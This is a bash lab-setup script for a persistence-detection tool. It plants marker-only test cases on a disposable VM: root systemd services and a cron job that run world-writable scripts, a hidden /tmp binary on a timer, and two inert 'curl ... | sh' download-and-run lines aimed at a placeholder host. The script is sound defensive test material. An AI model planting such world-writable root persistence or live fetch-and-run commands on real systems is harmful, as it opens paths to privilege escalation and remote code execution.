#!/usr/bin/env bash
# PersistCheck lab setup: plants HARMLESS test persistence so the tool has something to find.
# Run ONLY on a disposable lab VM you own. Undo everything with lab/cleanup.sh.
# Every payload only prints PERSISTCHECK_TEST. Nothing is downloaded or started.
#
# Usage: sudo ./lab/plant_test_persistence.sh --i-am-on-a-lab-vm

set -euo pipefail

if [[ "${1:-}" != "--i-am-on-a-lab-vm" ]]; then
    echo "Refusing to run. This changes system files and is for a disposable lab VM only."
    echo "Usage: sudo $0 --i-am-on-a-lab-vm"
    exit 1
fi
if [[ $EUID -ne 0 ]]; then
    echo "Must run as root (sudo)." ; exit 1
fi

LAB=/opt/persistcheck_lab
UNITS=/etc/systemd/system
WANTS=$UNITS/multi-user.target.wants
mkdir -p "$LAB" "$WANTS"
echo "PERSISTCHECK lab planted on $(date)" > "$LAB/PLANTED_BY_PERSISTCHECK_LAB"

payload() {  # payload <file>: harmless script that only prints a marker
    printf '#!/bin/sh\necho PERSISTCHECK_TEST\n' > "$1"
}

# ---- systemd test cases (Member 2) ---------------------------------------
# 1. Root service runs a world-writable script -> CRITICAL (privilege escalation)
payload "$LAB/svc_payload.sh"
chmod 777 "$LAB/svc_payload.sh"
cat > "$UNITS/pc-test-writable-exec.service" <<EOF
[Unit]
Description=PersistCheck lab test 1 - root runs a world-writable script
[Service]
ExecStart=/bin/sh $LAB/svc_payload.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
ln -sf "../pc-test-writable-exec.service" "$WANTS/pc-test-writable-exec.service"

# 2. World-writable unit file -> CRITICAL (any user can change what root runs)
cat > "$UNITS/pc-test-writable-unit.service" <<EOF
[Unit]
Description=PersistCheck lab test 2 - world-writable unit file
[Service]
ExecStart=/bin/echo PERSISTCHECK_TEST
EOF
chmod 666 "$UNITS/pc-test-writable-unit.service"

# 3. Hidden binary in /tmp, scheduled by a timer -> HIGH + T1053.006
payload /tmp/.pc_test_hidden
chmod 755 /tmp/.pc_test_hidden
cat > "$UNITS/pc-test-tmp.service" <<EOF
[Unit]
Description=PersistCheck lab test 3 - hidden program in /tmp
[Service]
ExecStart=/tmp/.pc_test_hidden
EOF
cat > "$UNITS/pc-test-tmp.timer" <<EOF
[Unit]
Description=PersistCheck lab test 3 timer
[Timer]
OnCalendar=hourly
EOF

# 4. Download-and-run pattern -> CRITICAL. The curl part is inside a shell comment, so it never runs.
cat > "$UNITS/pc-test-fetch.service" <<'EOF'
[Unit]
Description=PersistCheck lab test 4 - download-and-execute pattern (inert)
[Service]
ExecStart=/bin/sh -c 'echo PERSISTCHECK_TEST; exit 0 # curl http://example.invalid/x.sh | sh'
EOF

# ---- cron test case (for Member 1) ---------------------------------------
payload "$LAB/cron_payload.sh"
chmod 777 "$LAB/cron_payload.sh"
echo "*/30 * * * * root $LAB/cron_payload.sh > /dev/null 2>&1" > /etc/cron.d/pc-test

# ---- startup test case (for Member 3) ------------------------------------
# The variable is never set, so curl never runs; the pattern is still there to detect.
cat > /etc/profile.d/pc-test.sh <<'EOF'
# PersistCheck lab test - inert download pattern
[ -n "$PC_LAB_NEVER_SET" ] && curl -s http://example.invalid/x.sh | sh
EOF

echo "Planted lab test cases. Run PersistCheck now, then: sudo ./lab/cleanup.sh"
